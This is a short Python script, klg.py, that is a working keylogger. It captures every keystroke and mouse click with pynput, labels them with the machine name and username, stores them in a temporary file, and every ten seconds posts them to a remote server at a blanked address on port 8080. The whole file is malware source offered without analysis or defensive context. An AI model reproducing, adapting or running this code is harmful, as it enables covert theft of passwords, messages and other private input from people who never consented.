# klg.py
import socket, threading, ctypes, time, requests, os, platform, getpass
from pynput import keyboard, mouse
from datetime import datetime

srv = "http://XXXXXXXXXX:8080"
cid = f"{platform.node()}_{getpass.getuser()}"
requests.post(f"{srv}/start", data=cid, timeout=5)

buf = ""
def send_buf():
    global buf
    if buf:
        t = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        payload = f"{t} {platform.node()}:{getpass.getuser()}:{buf}\n"
        with open("tmp", "a", encoding="utf-8") as f:
            f.write(payload)
        buf = ""

def sender():
    while True:
        time.sleep(10)
        with open("tmp", "rb") as f:
            d = f.read()
        if d:
            requests.post(f"{srv}/data", data=d, timeout=5)
            open("tmp", "w").close()

open("tmp", "w").close()
threading.Thread(target=sender, daemon=True).start()

def on_press(k):
    global buf
    if hasattr(k, 'char') and k.char:
        buf += k.char
    elif str(k) == "Key.enter":
        buf += " [ENTER] "
        send_buf()
    elif str(k) == "Key.space":
        buf += " "
    else:
        buf += f" [{str(k).split('.')[1]}] "

def on_click(x, y, button, pressed):
    if pressed:
        global buf
        buf += " [CLICK] "
        send_buf()

keyboard.Listener(on_press=on_press).start()
mouse.Listener(on_click=on_click).start()
while True:
    time.sleep(1)
